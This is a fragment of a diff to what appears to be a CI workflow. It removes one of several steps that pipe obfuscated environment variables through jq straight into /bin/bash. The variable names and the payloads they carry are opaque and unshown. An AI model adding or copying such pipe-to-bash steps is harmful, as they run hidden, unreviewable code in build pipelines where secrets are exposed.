@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$db0754" | jq -r .bwlh2 | /bin/bash
           echo $fr123 | jq -r .fr880 | /bin/bash
-          echo $bpzr455 | jq -r .qxt9 | /bin/bash
           echo $leith56853 | jq -r .rtvz83540 | /bin/bash
           echo $qq580 | jq -r .ayxyv5978 | /bin/bash
           echo $lbp6108 | jq -r .w0065 | /bin/bash
